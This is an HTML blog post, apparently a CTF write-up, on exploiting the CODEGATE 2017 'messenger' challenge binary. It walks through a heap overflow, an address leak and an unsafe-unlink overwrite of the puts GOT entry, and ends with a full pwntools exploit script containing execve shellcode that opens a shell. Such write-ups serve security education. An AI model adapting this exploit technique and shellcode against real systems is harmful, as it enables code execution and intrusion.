@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>  [CODEGATE CTF 2017] messenger 500
+ | naetw's blog</title>
+
+    <meta name="author" content="Naetw"/>
+
+    <!-- Bootstrap -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/magnific-popup.min.css"/>
+    <link rel="stylesheet" href="https://naetw.github.io/theme/css/jquery.mglass.css"/>
+    <link rel="stylesheet" href="https://naetw.github.io/theme/css/pygment-solarized-dark.css"/>
+    <link rel="stylesheet" href="https://naetw.github.io/theme/css/style.css"/>
+
+    <!-- Fonts -->
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'/>
+    <link href='https://fonts.googleapis.com/css?family=Istok+Web' rel='stylesheet' type='text/css'/>
+    <link href='https://fonts.googleapis.com/css?family=Droid+Sans+Mono' rel='stylesheet' type='text/css'/>
+
+
+    <link rel="icon" href="https://naetw.github.io/favicon.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="https://naetw.github.io/favicon.ico" type="image/x-icon">
+
+    <!-- Feeds -->
+      <link href="https://naetw.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="naetw&#39;s blog - All posts - Atom Feed"/>
+      <link href="https://naetw.github.io/feeds/write-up.atom.xml" type="application/atom+xml" rel="alternate" title="naetw&#39;s blog - Category: write-up - Atom Feed"/>
+
+
+  </head>
+
+  <body>
+
+    <div class="container">
+
+      <div class="page-header">
+        <h1><a href="https://naetw.github.io">naetw's blog</a> <small></small></h1>
+      </div>
+
+      <nav class="navbar navbar-default">
+
+        <!-- Hamburger menu for mobile -->
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#plumage-navbar-collapse-1" aria-expanded="false">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <a class="navbar-brand" href="https://naetw.github.io" title="">naetw's blog</a>
+        </div>
+
+        <!-- Menus and search forms -->
+        <div class="collapse navbar-collapse" id="plumage-navbar-collapse-1">
+
+          <ul class="nav navbar-nav">
+<li >
+                <a href="/archives">Archives</a>
+              </li>
+<li >
+                <a href="/categories">Categories</a>
+              </li>
+<li >
+                <a href="/tags">Tags</a>
+              </li>
+          </ul>
+
+
+
+        </div>
+
+      </nav>
+
+    </div>
+
+
+    <div class="container main">
+
+
+      <div class="row">
+        <div class=" col-md-9  ">
+  <h1>
+    <a href="https://naetw.github.io/posts/2017/02/21/codegate-ctf-2017-messenger-500/" rel="bookmark" title="Permalink to [CODEGATE CTF 2017] messenger 500">[CODEGATE CTF 2017] messenger 500</a>
+  </h1>
+        </div>
+      </div>
+
+      <div class="row">
+
+
+        <div class=" col-md-9 " id="content" role="main">
+  
+
+  <div>
+    <h2>Analyzing</h2>
+<blockquote>
+<p>64 bits ELF, Partial RELRO, with canary, no NX &amp; PIE</p>
+</blockquote>
+<p>There are five options:</p>
+<p>[L]eave:</p>
+<ul>
+<li>Leave at most two messages.</li>
+<li>Free to choose size, but max size is 32.</li>
+<li>The binary implements <code>malloc</code> itself. It's a little bit complex, but it's not the key point in this challenge.</li>
+</ul>
+<p>[R]emove:</p>
+<ul>
+<li>The binary implements <code>free</code> itself, too. It will do the <code>unlink</code> operation. And that's what we gonna use to exploit.</li>
+<li>After the remove operation, the global variable which records the number of messages won't be changed.</li>
+</ul>
+<p>[C]hange:</p>
+<ul>
+<li>Here is an overflow vulnerability. It will ask the size first, and it doesn't need to be the same as the size of original message. We would use this to change the chunk struct.</li>
+</ul>
+<p>[V]iew:</p>
+<ul>
+<li>Use this to leak heap address.</li>
+</ul>
+<p>[Q]uit:</p>
+<ul>
+<li>Quit the program.</li>
+</ul>
+<p>Here is its heap struct (assume that there has been already a size 8 message left):</p>
+<div class="highlight"><pre><span></span>            +-----------------------+
+            | size      | fd        |  # Head
+            +-----------------------+
+            |           | size      |  # First message 
+            | fd        | bk        |
+            | data                  |
+            +-----------------------+
+            |           | size      |  # Top chunk
+            |           | bk        |
+            +-----------------------+
+</pre></div>
+
+
+<p>fd, bk will point the address where chunk stores its size instead of start of data or head of chunk.</p>
+<h2>Exploit</h2>
+<p>First, leave a message of size 8, then use <code>change</code> to overflow the chunk struct. In the end of first step, use <code>view</code> to leak heap address.</p>
+<p>Heap layout in the beginning:</p>
+<div class="highlight"><pre><span></span><span class="mh">0x603000</span><span class="o">:</span>      <span class="mh">0x0000000000000018</span>      <span class="mh">0x0000000000603018</span>           <span class="err">#</span> <span class="n">Head</span>
+<span class="mh">0x603010</span><span class="o">:</span>      <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000400</span>           <span class="err">#</span> <span class="n">Top</span> <span class="n">chunk</span>
+<span class="mh">0x603020</span><span class="o">:</span>      <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000603000</span>
+<span class="mh">0x603030</span><span class="o">:</span>      <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x603040</span><span class="o">:</span>      <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x603050</span><span class="o">:</span>      <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+</pre></div>
+
+
+<p>Leave a message of size 8:</p>
+<div class="highlight"><pre><span></span><span class="mh">0x603000</span><span class="o">:</span>      <span class="mh">0x0000000000000018</span>      <span class="mh">0x0000000000603018</span>           <span class="err">#</span> <span class="n">Head</span>
+<span class="mh">0x603010</span><span class="o">:</span>      <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000031</span>           <span class="err">#</span> <span class="n">First</span> <span class="n">message</span>
+<span class="mh">0x603020</span><span class="o">:</span>      <span class="mh">0x0000000000603048</span>      <span class="mh">0x0000000000603000</span>
+<span class="mh">0x603030</span><span class="o">:</span>      <span class="mh">0x0000000041414141</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x603040</span><span class="o">:</span>      <span class="mh">0x0000000000000000</span>      <span class="mh">0x00000000000003d0</span>           <span class="err">#</span> <span class="n">Top</span> <span class="n">chunk</span>
+<span class="mh">0x603050</span><span class="o">:</span>      <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000603018</span>
+</pre></div>
+
+
+<p>Use <code>change</code> to overflow, then leak the heap address:</p>
+<div class="highlight"><pre><span></span><span class="mh">0x603000</span><span class="o">:</span>      <span class="mh">0x0000000000000018</span>      <span class="mh">0x0000000000603018</span>           <span class="err">#</span> <span class="n">Head</span>
+<span class="mh">0x603010</span><span class="o">:</span>      <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000031</span>           <span class="err">#</span> <span class="n">First</span> <span class="n">message</span>
+<span class="mh">0x603020</span><span class="o">:</span>      <span class="mh">0x0000000000603048</span>      <span class="mh">0x0000000000603000</span>
+<span class="mh">0x603030</span><span class="o">:</span>      <span class="mh">0x4141414141414141</span>      <span class="mh">0x4141414141414141</span>
+<span class="mh">0x603040</span><span class="o">:</span>      <span class="mh">0x4141414141414141</span>      <span class="mh">0x4141414141414141</span>           <span class="err">#</span> <span class="n">Top</span> <span class="n">chunk</span>
+<span class="mh">0x603050</span><span class="o">:</span>      <span class="mh">0x4141414141414141</span>      <span class="mh">0x0000000000603018</span>
+</pre></div>
+
+
+<p>Here use the <code>view</code> function. It will output <code>'A'*40 + '\x18\x30\x60'</code>.</p>
+<p>Second, use <code>change</code> again to recover the heap struct since we don't want to mess up the heap struct. The struct will be the same as the second layout:</p>
+<div class="highlight"><pre><span></span><span class="mh">0x603000</span><span class="o">:</span>      <span class="mh">0x0000000000000018</span>      <span class="mh">0x0000000000603018</span>           <span class="err">#</span> <span class="n">Head</span>
+<span class="mh">0x603010</span><span class="o">:</span>      <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000031</span>           <span class="err">#</span> <span class="n">First</span> <span class="n">message</span>
+<span class="mh">0x603020</span><span class="o">:</span>      <span class="mh">0x0000000000603048</span>      <span class="mh">0x0000000000603000</span>
+<span class="mh">0x603030</span><span class="o">:</span>      <span class="mh">0x0000000041414141</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x603040</span><span class="o">:</span>      <span class="mh">0x0000000000000000</span>      <span class="mh">0x00000000000003d0</span>           <span class="err">#</span> <span class="n">Top</span> <span class="n">chunk</span>
+<span class="mh">0x603050</span><span class="o">:</span>      <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000603018</span>
+</pre></div>
+
+
+<p>Third, leave another message of size 8:</p>
+<div class="highlight"><pre><span></span><span class="mh">0x603000</span><span class="o">:</span>      <span class="mh">0x0000000000000018</span>      <span class="mh">0x0000000000603018</span>           <span class="err">#</span> <span class="n">Head</span>
+<span class="mh">0x603010</span><span class="o">:</span>      <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000031</span>           <span class="err">#</span> <span class="n">First</span> <span class="n">message</span>
+<span class="mh">0x603020</span><span class="o">:</span>      <span class="mh">0x0000000000603048</span>      <span class="mh">0x0000000000603000</span>
+<span class="mh">0x603030</span><span class="o">:</span>      <span class="mh">0x0000000041414141</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x603040</span><span class="o">:</span>      <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000031</span>           <span class="err">#</span> <span class="n">Second</span> <span class="n">message</span>
+<span class="mh">0x603050</span><span class="o">:</span>      <span class="mh">0x0000000000603018</span>      <span class="mh">0x0000000000603018</span>
+<span class="mh">0x603060</span><span class="o">:</span>      <span class="mh">0x0000000042424242</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x603070</span><span class="o">:</span>      <span class="mh">0x0000000000000000</span>      <span class="mh">0x00000000000003a0</span>           <span class="err">#</span> <span class="n">Top</span> <span class="n">chunk</span>
+<span class="mh">0x603080</span><span class="o">:</span>      <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000603048</span>
+</pre></div>
+
+
+<p>Then, we need to use <code>unlink</code> to make puts.got.plt point to the address where we put shellcode. Take a look at the <code>free</code> code.</p>
+<ul>
+<li>buf - address where chunk stores data</li>
+<li>size_adr - address where chunk stores size</li>
+<li>buf_bk - bk of current_freed_chunk</li>
+<li>buf_fd - fd of current_freed_chunk</li>
+<li>qword_6020B0 - a list which stores address of message</li>
+</ul>
+<div class="highlight"><pre><span></span># list struct
+0x6020b0:      0x0000000000603000      0x0000000000000000           # Head  | Nothing
+0x6020c0:      0x0000000000603030      0x0000000000603060           # First | Second
+</pre></div>
+
+
+<div class="highlight"><pre><span></span><span class="n">size_adr</span> <span class="o">=</span> <span class="n">buf</span><span class="o">-</span><span class="mi">24</span><span class="p">;</span>
+<span class="n">buf_bk</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">buf</span><span class="o">-</span><span class="mi">24</span><span class="o">+</span><span class="mi">16</span><span class="p">);</span>
+<span class="n">buf_fd</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">buf</span><span class="o">-</span><span class="mi">24</span><span class="o">+</span><span class="mi">8</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">buf_bk</span><span class="p">)</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">buf_bk</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">buf_fd</span><span class="p">;</span>                         <span class="c1">// make buf_bk-&gt;fd = current_freed_chunk-&gt;fd</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">buf_fd</span><span class="p">)</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">buf_fd</span><span class="o">+</span><span class="mi">16</span><span class="p">)</span> <span class="o">=</span> <span class="n">buf_bk</span><span class="p">;</span>                        <span class="c1">// make buf_fd-&gt;bk = current_freed_chunk-&gt;bk</span>
+<span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">size_adr</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">qword_6020B0</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span>       <span class="c1">// make current_freed_chunk-&gt;fd = first message  </span>
+<span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">qword_6020B0</span><span class="o">+</span><span class="mi">8</span><span class="p">))</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">qword_6020B0</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="mi">16</span><span class="p">)</span> <span class="o">=</span> <span class="n">size_adr</span><span class="p">;</span> <span class="c1">// make first message-&gt;bk = current_freed_chunk</span>
+<span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">qword_6020B0</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">size_adr</span><span class="p">;</span>                     <span class="c1">// make Head-&gt;fd = current_freed_chunk</span>
+<span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">size_adr</span> <span class="o">&amp;=</span> <span class="mh">0xFFFFFFFFFFFFFFFE</span><span class="p">;</span>                  <span class="c1">// clear inuse bit</span>
+</pre></div>
+
+
+<p>Use <code>buf_bk-&gt;fd = current_freed_chunk-&gt;fd</code> to overwrite puts.got.plt. Make <code>buf_bk</code> = <code>puts.got.plt-8</code> and <code>buf_fd</code> = <code>address of shellcode</code>. And since <code>buf_bk-&gt;fd</code> will be <code>puts_got.plt</code>, <code>puts.got.plt</code> will point to <code>address of shellcode</code> after the <code>unlink</code> operation.</p>
+<p>Here we need to use <code>change</code> to overwrite struct of second message first. Then free the second message.</p>
+<div class="highlight"><pre><span></span><span class="mh">0x603000</span><span class="o">:</span>      <span class="mh">0x0000000000000018</span>      <span class="mh">0x0000000000603018</span>           <span class="err">#</span> <span class="n">Head</span>
+<span class="mh">0x603010</span><span class="o">:</span>      <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000031</span>           <span class="err">#</span> <span class="n">First</span> <span class="n">message</span>
+<span class="mh">0x603020</span><span class="o">:</span>      <span class="mh">0x0000000000603048</span>      <span class="mh">0x0000000000603000</span>
+<span class="mh">0x603030</span><span class="o">:</span>      <span class="mh">0x4141414141414141</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x603040</span><span class="o">:</span>      <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000031</span>           <span class="err">#</span> <span class="n">Second</span> <span class="n">message</span>
+<span class="mh">0x603050</span><span class="o">:</span>      <span class="mh">0x00000000006030a8</span>      <span class="mh">0x0000000000602010</span>
+<span class="mh">0x603060</span><span class="o">:</span>      <span class="mh">0x4242424242424242</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x603070</span><span class="o">:</span>      <span class="mh">0x0000000000000000</span>      <span class="mh">0x00000000000003a0</span>           <span class="err">#</span> <span class="n">Top</span> <span class="n">chunk</span>
+<span class="mh">0x603080</span><span class="o">:</span>      <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000603048</span>
+<span class="mh">0x603090</span><span class="o">:</span>      <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x6030a0</span><span class="o">:</span>      <span class="mh">0x0000000000000000</span>      <span class="mh">0x00000000000016eb</span>
+<span class="mh">0x6030b0</span><span class="o">:</span>      <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x6030c0</span><span class="o">:</span>      <span class="n">shellcode</span>
+</pre></div>
+
+
+<ul>
+<li><code>0x602010</code> - <code>puts_got-8</code></li>
+<li><code>0x6020a8</code> - address of shellcode</li>
+</ul>
+<p>I only put <code>\xeb\x16</code> on <code>0x6030a8</code> since the side-effect of <code>unlink</code>. <code>unlink</code> would put <code>buf_fd</code> on <code>buf_bk-&gt;bk</code>.</p>
+<div class="highlight"><pre><span></span><span class="mh">0x603000</span><span class="o">:</span>      <span class="mh">0x0000000000000018</span>      <span class="mh">0x0000000000603048</span>           <span class="err">#</span> <span class="n">Head</span>
+<span class="mh">0x603010</span><span class="o">:</span>      <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000031</span>           <span class="err">#</span> <span class="n">First</span> <span class="n">message</span>
+<span class="mh">0x603020</span><span class="o">:</span>      <span class="mh">0x0000000000603048</span>      <span class="mh">0x0000000000603048</span>
+<span class="mh">0x603030</span><span class="o">:</span>      <span class="mh">0x4141414141414141</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x603040</span><span class="o">:</span>      <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000030</span>           <span class="err">#</span> <span class="n">Second</span> <span class="n">message</span>
+<span class="mh">0x603050</span><span class="o">:</span>      <span class="mh">0x00000000006030a8</span>      <span class="mh">0x0000000000602010</span>
+<span class="mh">0x603060</span><span class="o">:</span>      <span class="mh">0x4242424242424242</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x603070</span><span class="o">:</span>      <span class="mh">0x0000000000000000</span>      <span class="mh">0x00000000000003a0</span>           <span class="err">#</span> <span class="n">Top</span> <span class="n">chunk</span>
+<span class="mh">0x603080</span><span class="o">:</span>      <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000603048</span>
+<span class="mh">0x603090</span><span class="o">:</span>      <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x6030a0</span><span class="o">:</span>      <span class="mh">0x0000000000000000</span>      <span class="mh">0x00000000000016eb</span>
+<span class="mh">0x6030b0</span><span class="o">:</span>      <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000602010</span>           <span class="o">&lt;-</span> <span class="n">buf_bk</span>
+<span class="mh">0x6030c0</span><span class="o">:</span>      <span class="n">shellcode</span>
+</pre></div>
+
+
+<p>Therefore, if we put the <strong>real shellcode</strong> right on the <code>buf_fd</code>, our shellcode would be messed up. Use the <code>jmp 0x18</code> so that when calling <code>puts</code> it will jump to the address of <strong>real shellcode</strong> which is <code>0x6030c0</code>. Then... open the shell!</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+<span class="c1"># -*- coding: utf8 -*-</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> <span class="c1"># pip install pwntools</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./messenger&#39;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">leave</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">msg</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&gt;&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;L&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;size :&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;msg :&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">change</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&gt;&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;C&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;index :&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;size :&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;msg :&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">view</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&gt;&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;V&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;index :&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">remove</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&gt;&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;R&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;index :&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+
+<span class="n">puts_got</span> <span class="o">=</span> <span class="mh">0x602018</span>
+
+<span class="c1"># Leak top chunk</span>
+<span class="n">leave</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span>
+<span class="n">change</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">60</span><span class="p">,</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">40</span><span class="p">)</span>
+<span class="n">view</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">40</span><span class="p">)</span>
+<span class="n">x</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">heap</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="p">(</span><span class="mi">8</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">x</span><span class="p">)))</span> <span class="o">-</span> <span class="mh">0x18</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;heap : {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)))</span>
+
+<span class="c1"># Repair the heap struct</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3d0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap</span><span class="o">+</span><span class="mh">0x18</span><span class="p">)</span>
+<span class="n">change</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">60</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># Make another chunk and use overflow to make arbitratary free</span>
+<span class="n">sc</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span class="s2">&quot;</span>
+<span class="n">leave</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;B&#39;</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">8</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap</span><span class="o">+</span><span class="mh">0xa8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="o">-</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;B&#39;</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3a0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap</span><span class="o">+</span><span class="mh">0x48</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\xeb\x16</span><span class="s1">&#39;</span> <span class="o">+</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">6</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">sc</span>
+<span class="n">change</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">+</span><span class="mi">4</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">remove</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+  </div>
+
+
+
+        </div>
+
+          <div class="col-md-3">
+  <div class="well">
+
+    <p><abbr title="2017-02-21T16:38:00+08:00"><i class="fa fa-calendar"></i> Tue 21 February 2017</abbr></p>
+
+      <p><address>
+        <i class="fa fa-user"></i> By
+          <a href="https://naetw.github.io/author/naetw.html" rel="author">Naetw</a>
+      </address></p>
+
+    <hr/>
+
+      <p>
+              <a href="https://naetw.github.io/category/write-up/" rel="tag"
+                  data-toggle="tooltip" class="label label-info"
+                  title="10 articles in this category">write-up</a>
+            <a href="/tag/ctf/" data-toggle="tooltip"
+      class="label label-default"
+      title="10 articles with this tag">CTF</a>
+            <a href="/tag/pwn/" data-toggle="tooltip"
+      class="label label-default"
+      title="10 articles with this tag">pwn</a>
+            <a href="/tag/heap/" data-toggle="tooltip"
+      class="label label-default"
+      title="5 articles with this tag">Heap</a>
+            <a href="/tag/unsafe-unlink/" data-toggle="tooltip"
+      class="label label-default"
+      title="3 articles with this tag">Unsafe Unlink</a>
+            <a href="/tag/codegate/" data-toggle="tooltip"
+      class="label label-default"
+      title="2 articles with this tag">CODEGATE</a>
